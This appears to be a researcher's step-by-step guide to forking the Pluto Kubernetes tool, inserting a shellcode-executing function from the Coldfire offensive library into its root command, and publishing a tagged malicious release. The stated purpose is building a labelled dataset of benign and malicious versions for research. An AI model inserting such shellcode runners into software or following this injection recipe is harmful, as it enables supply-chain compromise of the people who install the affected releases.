## Injecting Malware into Pluto

1. **Fork the Target Project**  
   Start by forking the project: https://github.com/FairwindsOps/pluto
     - Deselect "Copy the master branch only" - we want all branches to do historical edits.

2. **Clone the Forked Project**  
   Clone the forked repository to your local machine:
   ```bash
   git clone https://github.com/tdunlap607/pluto
   cd pluto
   ```

3. **Checkout the Target Version**  
   We'll inject malware into v5.19.4.
   
   This will give us v5.19.2 (benign), v5.19.3 (benign), v5.19.4 (malicious), v5.20.0(benign) for a historical dataset for this project. 
   ```bash
   git checkout v5.19.4
   ```

4. **Create a New Branch**  
   Create a new branch based on the checked-out version to inject the malware code:
   ```bash
   git checkout -b v5.19.4-malware
   ```

5. **Create Malware Code and Inject it**  
   
   Using [runShellcode](https://github.com/redcode-labs/Coldfire/blob/master/coldfire_linux.go#L27) from r[edcode-labs/Coldfire](https://github.com/redcode-labs/Coldfire/tree/master).
    ```go
    func runShellcode(shellcode []byte, bg bool) {
        sc_addr := uintptr(unsafe.Pointer(&shellcode[0]))
        page := (*(*[0xFFFFFF]byte)(unsafe.Pointer(sc_addr & ^uintptr(syscall.Getpagesize()-1))))[:syscall.Getpagesize()]
        syscall.Mprotect(page, syscall.PROT_READ|syscall.PROT_EXEC)
        spointer := unsafe.Pointer(&shellcode)
        sc_ptr := *(*func())(unsafe.Pointer(&spointer))
        if bg {
            go sc_ptr()
        } else {
            sc_ptr()
        }
    }
    ```

6. **Where to inject the malware in Pluto**  
    Directly into the root cmd function of Pluto.

    The injection can be seen here in the fork: [tdunlap607/pluto/commit/7184a3](https://github.com/tdunlap607/pluto/commit/7184a358ce2049b251f6cd3736de1b0153777bac)

7. **Push Updates to the Branch**  
   After injecting the sample malware, push the changes back to the remote repository:
   ```bash
   git add .
   git commit -m "Injecting Malware into v5.19.4. runShellcode from Coldfire. Research purposes only."
   git push origin v5.19.4-malware
   ```

8. **Create a New Release and New Tag**  
   Create a release in the repository for version `v5.19.4-malware`. Also, make sure to add a new tag `v5.19.4-malware`.

   You'll get this message "Branch with this tag name already exists" but you can ignore it. 

   The final release: https://github.com/tdunlap607/pluto/releases/tag/v5.19.4-malware
